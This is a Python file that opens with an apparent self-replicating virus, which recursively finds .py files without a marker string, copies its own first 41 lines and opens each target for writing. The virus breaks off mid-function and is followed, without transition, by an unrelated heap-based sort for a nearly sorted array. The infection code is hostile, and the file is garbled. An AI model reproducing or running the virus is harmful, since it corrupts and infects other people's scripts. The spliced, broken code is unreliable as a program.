#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A Python3 program to sort a
# nearly sorted array.
 
from heapq import heappop, heappush, heapify
 
 
# A utility function to print
# array elements
def print_array(arr: list):
    for elem in arr:
        print(elem, end=' ')
 
# Given an array of size n, where every
# element is k away from its target
# position, sorts the array in O(nLogk) time.
 
 
def sort_k(arr: list, n: int, k: int):
    """
    :param arr: input array
    :param n: length of the array
    :param k: max distance, which every
     element is away from its target position.
    :return: None
    """
    # List of first k+1 items
    heap = arr[:k + 1]
 
    # using heapify to convert list
    # into heap(or min heap)
    heapify(heap)
 
    # "rem_elmnts_index" is index for remaining
    # elements in arr and "target_index" is
    # target index of for current minimum element
    # in Min Heap "heap".
    target_index = 0
    for rem_elmnts_index in range(k + 1, n):
        arr[target_index] = heappop(heap)
        heappush(heap, arr[rem_elmnts_index])
        target_index += 1
 
    while heap:
        arr[target_index] = heappop(heap)
        target_index += 1
 
 
# Driver Code
k = 3
arr = [2, 6, 3, 12, 56, 8]
n = len(arr)
sort_k(arr, n, k)
 
print('Following is sorted array')
print_array(arr)
 
# This code is contributed by
# Veerat Beri(viratberi)
'''
Time Complexity: O(k) + O((m) * log(k)), where m = n - k
Space Complexity: O(k)
'''